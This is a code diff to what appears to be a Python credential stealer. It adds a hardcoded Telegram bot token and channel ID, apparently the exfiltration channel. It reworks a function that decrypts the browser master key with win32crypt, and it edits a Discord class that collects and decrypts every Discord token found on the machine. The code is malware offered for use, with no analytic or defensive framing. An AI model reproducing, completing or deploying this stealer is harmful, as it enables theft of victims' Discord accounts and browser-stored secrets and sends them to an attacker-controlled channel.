@@ -9,8 +9,8 @@ import subprocess
 
 
 
-BOT_TOKEN = 'TELEGRAM BOT TOKEN'
-CHANNEL_ID = TELEGRAM CHANNEL ID WHERE THE BOT IS LOCATED
+BOT_TOKEN = '7147454534:AAHa08rDeHun1_JWqqOMu9wPAas1I9_Wpbc'
+CHANNEL_ID = -1002015035900
 
 
 def send_download_link(download_link):
@@ -58,10 +58,9 @@ def get_masterKey():
     with open(path, 'r') as f:
         data = f.read()
         data = json.loads(data)
-        key = data['os_crypt'][
-            'encrypted_key']  # this is the master key, but it's encrypted with win32crypt windows function
-        return win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[
-            1]  # we decrypted the master key, and it's ready to use
+        key = data['os_crypt']['encrypted_key']  # this is the master key, but it's encrypted with win32crypt windows function
+        decoded_key = base64.b64decode(key)[5:]
+        return win32crypt.CryptUnprotectData(decoded_key, None, None, None, 0)[1]  # we decrypted the master key, and it's ready to use
 
 
 class Discord:
@@ -72,6 +71,7 @@ class Discord:
         """
         Grab All Discord Tokens Found on This Machine.
         """
+
 
     def get_tokens(self):
         """
@@ -102,6 +102,7 @@ class Discord:
 
                     self.decrypted_tokens.append(decrypted_token[:-16].decode('utf-8'))
                 except UnicodeDecodeError:
+                    '''Its Not A Token Structure'''
                     continue
 
         return self.decrypted_tokens
